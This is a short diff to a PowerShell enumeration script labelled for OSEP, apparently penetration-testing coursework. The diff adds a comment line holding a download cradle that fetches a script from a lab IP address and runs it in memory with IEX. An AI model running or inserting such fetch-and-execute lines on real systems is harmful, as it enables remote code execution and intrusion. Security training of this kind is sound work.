@@ -1,3 +1,4 @@
+# powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_enum.ps1') | IEX"
 # PowerShell Enumeration Script for OSEP
 # 1. Enumerate Network Shares and Mapped Shares
 Write-Host "Enumerating Network and Mapped Shares... Please check for non default shares."
